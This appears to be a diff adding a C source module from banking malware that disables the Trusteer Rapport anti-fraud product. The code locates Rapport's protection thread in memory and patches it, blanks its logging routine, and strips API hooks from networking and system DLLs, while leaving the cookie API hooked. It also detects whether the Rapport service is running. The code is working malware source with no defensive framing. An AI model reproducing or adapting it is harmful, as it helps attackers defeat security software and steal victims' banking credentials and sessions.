@@ -1,0 +1,340 @@
+#include <intrin.h>
+#include <windows.h>
+#include <wininet.h>
+//#include <stdio.h>
+#include <shlwapi.h>
+//#include <shlobj.h>
+#pragma warning(push)
+#pragma warning(disable:4005)
+#include "ntdll.h"
+#pragma warning(pop)
+#include <psapi.h>
+#include "GetApi.h"
+#include "memory.h"
+#include "tlhelp32.h"
+
+#pragma comment(lib,"psapi.lib")
+
+#include "utils.h"
+#include "zdisasm.h"
+#include "antirapport.h"
+
+/*
+NTSYSAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(
+                IN PVOID Base);
+
+NTSYSAPI
+PVOID
+NTAPI
+RtlImageDirectoryEntryToData(PVOID BaseAddress,
+                             BOOLEAN MappedAsImage,
+                             USHORT Directory,
+                             PULONG Size);
+*/
+
+HMODULE MyGetModuleBase(LPCSTR lpDll)
+{
+	HMODULE hDll = (HMODULE)pGetModuleHandleA(lpDll);
+
+	return hDll ? hDll : (HMODULE)pLoadLibraryA(lpDll);
+}
+
+PIMAGE_SECTION_HEADER SearchSection(PIMAGE_NT_HEADERS pHeaders,LPCSTR lpName)
+{
+	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pHeaders);
+
+	for (WORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
+	{
+		if (!plstrcmpA(lpName,(PCHAR)&pSection->Name)) return pSection;
+
+		pSection++;
+	}
+
+	return 0;
+};
+
+
+PVOID MapBinary(LPCTSTR Path)
+{
+	LPVOID Map = NULL;
+	HANDLE hMapping;
+	HANDLE hFile;
+
+	hFile = pCreateFileA(Path,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
+	if (hFile != INVALID_HANDLE_VALUE)
+	{
+		hMapping = pCreateFileMappingA(hFile,0,PAGE_READONLY|SEC_IMAGE,0,0,0);
+		if (hMapping != INVALID_HANDLE_VALUE)
+		{
+			Map = pMapViewOfFile(hMapping,FILE_MAP_READ,0,0,0);
+
+			pCloseHandle(hMapping);
+		}
+
+		pCloseHandle(hFile);
+	}
+
+	return Map;
+}
+
+DWORD AntiRapportFindStr(HMODULE hRapportModule,LPCSTR lpFound,DWORD dwFoundLen)
+{
+	DWORD dwResult = 0;
+
+	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(hRapportModule);
+	if (pHeaders)
+	{
+		PIMAGE_SECTION_HEADER pRData = SearchSection(pHeaders,".rdata");
+		if (pRData)
+		{
+			PUCHAR pAddr = (PUCHAR)((DWORD)hRapportModule + pRData->VirtualAddress);
+
+			for (DWORD i = 0; i < pRData->SizeOfRawData - dwFoundLen - 1; i++)
+			{
+				LPCSTR lpStr = (LPCSTR)(pAddr + i);
+
+				if (!m_memcmp(lpStr,lpFound,dwFoundLen + 1))
+				{
+					dwResult = (DWORD)lpStr;
+
+					break;
+				}
+			}
+		}
+	}
+
+	return dwResult;
+}
+
+PVOID AnitRapportFindPushStrs(HMODULE hRapportModule,DWORD dwStr1,DWORD dwStr2,PVOID *pvLogFix)
+{
+	PVOID pvResult = 0;
+
+	PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS) pRtlImageNtHeader(hRapportModule);
+	if (pHeaders)
+	{
+		PIMAGE_SECTION_HEADER pRData = SearchSection(pHeaders,".text");
+		if (pRData)
+		{
+			PUCHAR pAddr = (PUCHAR)((DWORD)hRapportModule + pRData->VirtualAddress);
+			DWORD dwSize;
+
+			for (DWORD i = 0; i < pRData->SizeOfRawData - 8; i++, pAddr++)
+			{
+				if (*(DWORD*)pAddr == dwStr1)
+				{
+					GetInstLenght((PDWORD)(pAddr - 1),&dwSize);
+					if (dwSize == 5)
+					{
+						if (*(DWORD*)(pAddr + 5) == dwStr2)
+						{
+							GetInstLenght((PDWORD)(pAddr + 4),&dwSize);
+							if (dwSize == 5)
+							{
+								pvResult = (PVOID)(pAddr - 7);
+								*pvLogFix = (PVOID)(*(DWORD*)((DWORD)pAddr + 12) + (DWORD)(pAddr + 11) + 5);
+
+								break;
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	return pvResult;
+}
+
+VOID UnhookModuleExports(HMODULE hModule)
+{
+	CHAR szModuleFileName[MAX_PATH];
+
+	pGetModuleFileNameA(hModule,szModuleFileName,sizeof(szModuleFileName));
+	PVOID pMap = MapBinary(szModuleFileName);
+	if (pMap)
+	{
+		PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)pRtlImageNtHeader(hModule);
+		if (pNtHeaders)
+		{
+			DWORD dwExportsSize;
+			//PIMAGE_NT_HEADERS pnt = (PIMAGE_NT_HEADERS)(PIMAGE_DOS_HEADER(hModule)->e_lfanew +(PCHAR)hModule);
+			//	dwExportsSize = pnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
+			/*PIMAGE_EXPORT_DIRECTORY(PCHAR(hModule) + pnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);//*/
+			PIMAGE_EXPORT_DIRECTORY ExportDirectory =(PIMAGE_EXPORT_DIRECTORY)pRtlImageDirectoryEntryToData((PVOID)hModule,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&dwExportsSize);
+			if (ExportDirectory && dwExportsSize)
+			{
+
+				PUSHORT Ords = (PUSHORT)((DWORD)hModule+ExportDirectory->AddressOfNameOrdinals);
+				PULONG EntriesRva = (PULONG)((DWORD)hModule+ExportDirectory->AddressOfFunctions);
+				PULONG Names = (PULONG)((DWORD)hModule+ExportDirectory->AddressOfNames);
+
+				for (ULONG cEntry = 0; cEntry < ExportDirectory->NumberOfNames; cEntry++)
+				{
+					ULONG StartSize = 10;
+					PVOID ApiStart = (PVOID)((DWORD)hModule+EntriesRva[Ords[cEntry]]);
+					PVOID ApiOriginalStart = (PVOID)((DWORD)pMap+EntriesRva[Ords[cEntry]]);
+
+					if (m_memcmp(ApiStart,ApiOriginalStart,StartSize))
+					{
+						BOOL bRestore = TRUE;
+
+					//	DbgPrint("Hook found %s - %08x - %s ...",szModuleFileName,ApiStart,((DWORD_PTR)hModule+Names[cEntry]));
+
+						if (!plstrcmpA((PCHAR)((DWORD_PTR)hModule+Names[cEntry]),"InternetGetCookieExA"))
+						{
+							bRestore = FALSE;
+						}
+
+						if (*(BYTE*)ApiStart == 0xE9)
+						{
+							PVOID Handler = (PVOID)(*(DWORD*)((DWORD)ApiStart + 1) + (DWORD)ApiStart + 5);
+							CHAR FileName[MAX_PATH];
+
+							if (pGetMappedFileNameA(pGetCurrentProcess(),Handler,FileName,RTL_NUMBER_OF(FileName)-1))
+							{
+								if (!plstrcmpA(pPathFindFileNameA(FileName),"ieframe.dll"))
+								{
+							//		DbgPrint("Not restored.\n");
+									bRestore = FALSE;
+								}
+							}
+						}
+
+						if (bRestore)
+						{
+							ULONG Written;
+							if (pWriteProcessMemory(pGetCurrentProcess(),ApiStart,ApiOriginalStart,StartSize,&Written))
+							{
+							//	DbgPrint("Restored.\n");
+							}
+							else
+							{
+							//	DbgPrint(__FUNCTION__"(): WriteProcessMemory failed with error %lx\n",GetLastError());
+							}
+						}
+					}
+				}
+			}
+		}
+
+		UnmapViewOfFile(pMap);
+	}
+}
+
+VOID UnhookLibs()
+{
+	UnhookModuleExports(MyGetModuleBase("ntdll"));
+	UnhookModuleExports(MyGetModuleBase("kernel32"));
+	UnhookModuleExports(MyGetModuleBase("mswsock"));
+	UnhookModuleExports(MyGetModuleBase("ws2_32"));
+	UnhookModuleExports(MyGetModuleBase("wsock32"));
+	UnhookModuleExports(MyGetModuleBase("wininet"));
+	if (!GetModuleHandle("ieframe.dll"))
+	{
+		UnhookModuleExports(MyGetModuleBase("user32.dll"));
+	}
+	UnhookModuleExports(MyGetModuleBase("gdi32.dll"));
+}
+
+BOOL AntiRapport()
+{
+	BOOL bRet = FALSE;
+	UCHAR Buf;
+	DWORD t;
+	HMODULE hRapportModule;
+	LPCSTR lpStr1;
+	LPCSTR lpStr2;
+	DWORD dwStr1;
+	DWORD dwStr2;
+	PVOID pvLogFix;
+	PVOID pvFix;
+
+		
+	pLoadLibraryA("wininet.dll");
+	pLoadLibraryA("user32.dll");
+
+	hRapportModule =(HMODULE) pGetModuleHandleA("RapportUtil.dll");
+	if (hRapportModule)
+	{
+		lpStr1 = "periodic_checkpoint::periodic_checkpoint_thread";
+		lpStr2 = ".\\patching_sentry\\periodic_checkpoint.cpp";
+
+		dwStr1 = AntiRapportFindStr(hRapportModule,lpStr1,(DWORD)plstrlenA(lpStr1));
+		if (dwStr1)
+		{
+			dwStr2 = AntiRapportFindStr(hRapportModule,lpStr2,(DWORD)plstrlenA(lpStr2));
+			if (dwStr2)
+			{
+				pvFix = AnitRapportFindPushStrs(hRapportModule,dwStr1,dwStr2,&pvLogFix);
+				if (pvFix)
+				{
+					Buf = 0x19;
+					if (pWriteProcessMemory(pGetCurrentProcess(),pvFix,(PVOID)&Buf,sizeof(Buf),&t))
+					{
+						bRet = TRUE;
+
+					//	DbgPrint(__FUNCTION__"(): rapport protect thread patched at %x\n",pvFix);
+					}
+					else
+					{
+						//DbgPrint(__FUNCTION__"(): WriteProcessMemory failed with error %lx\n",GetLastError());
+					}
+
+					if (pvLogFix)
+					{
+						Buf = 0xC3;
+						if (pWriteProcessMemory(NtCurrentProcess(),pvLogFix,(PVOID)&Buf,sizeof(Buf),&t))
+						{
+						//	DbgPrint(__FUNCTION__"(): rapport log proc patched at %x\n",pvLogFix);
+						}
+						else
+						{
+						//	DbgPrint(__FUNCTION__"(): WriteProcessMemory failed with error %lx\n",GetLastError());
+						}
+					}
+							
+					pSleep(4000);
+					
+					UnhookLibs();
+				}
+			}
+		}
+	}
+
+	return bRet;
+}
+
+
+
+BOOL IsRunAntiRapport()
+{
+	HANDLE hSnap;
+	BOOL ret = FALSE;
+	PROCESSENTRY32 proc32 ;
+	m_memset(&proc32,0,sizeof(PROCESSENTRY32));
+	
+	hSnap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
+
+	if (hSnap == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	proc32.dwSize = sizeof(proc32);
+
+
+	if ( pProcess32First(hSnap,&proc32))
+	{
+		do{
+			proc32.dwSize = sizeof(proc32);
+			if (! plstrcmpA(proc32.szExeFile,"RapportMgmtService.exe"))
+			{
+				ret = TRUE;
+				break;
+			};
+
+		}while(pProcess32Next(hSnap,&proc32));
+	};
+
+	pCloseHandle(hSnap);
+	return ret;
+};
